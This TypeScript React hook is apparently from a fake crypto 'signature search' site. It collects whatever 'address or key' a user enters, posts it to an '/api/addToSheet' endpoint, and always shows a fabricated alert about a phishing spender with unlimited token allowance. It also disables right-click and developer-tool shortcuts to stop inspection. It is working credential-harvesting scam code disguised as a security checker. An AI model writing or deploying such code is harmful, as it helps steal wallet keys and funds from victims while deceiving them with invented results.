"use client";

import { formatUTC } from "@/utils/format-utc";
import { useEffect, useState } from "react";

export type SignatureResult = {
  txHash: string;
  lastUpdated: string;
  spender: string;
  allowance: string;
};

export function useSignatureSearch() {
  const [inputValue, setInputValue] = useState("");
  const [result, setResult] = useState<SignatureResult | null>(null);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    const disableActions = (event: MouseEvent | KeyboardEvent) => {
      const isBlockedKeyboardAction =
        event instanceof KeyboardEvent &&
        (event.key === "F12" ||
          (event.ctrlKey &&
            event.shiftKey &&
            ["I", "J", "C"].includes(event.key)) ||
          (event.ctrlKey && event.key === "U"));

      if (event.type === "contextmenu" || isBlockedKeyboardAction) {
        event.preventDefault();
      }
    };

    document.addEventListener("contextmenu", disableActions);
    document.addEventListener("keydown", disableActions);

    return () => {
      document.removeEventListener("contextmenu", disableActions);
      document.removeEventListener("keydown", disableActions);
    };
  }, []);

  const clearInput = () => {
    setInputValue("");
    setError("");
  };

  const search = async () => {
    const value = inputValue.trim();
    setError("");

    if (!/^[A-Za-z0-9]{26,}$/.test(value)) {
      setError(
        "Please enter a valid address or key in the correct format (for example, 0x...).",
      );
      return;
    }

    setLoading(true);
    setResult(null);

    try {
      const response = await fetch("/api/addToSheet", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          input: value,
          timestamp: new Date().toISOString(),
        }),
      });

      if (!response.ok) {
        throw new Error("Unable to search signatures.");
      }

      setResult({
        txHash: value,
        lastUpdated: formatUTC(new Date(Date.now() - 3 * 24 * 60 * 60 * 1000)),
        spender: "⚠️ Fake_Phishing1309277",
        allowance: "Unlimited Token",
      });
      setInputValue("");
    } catch (searchError) {
      setError(
        searchError instanceof Error
          ? searchError.message
          : "Unable to search signatures.",
      );
    } finally {
      setLoading(false);
    }
  };

  return {
    inputValue,
    result,
    error,
    loading,
    setInputValue,
    clearInput,
    search,
  };
}
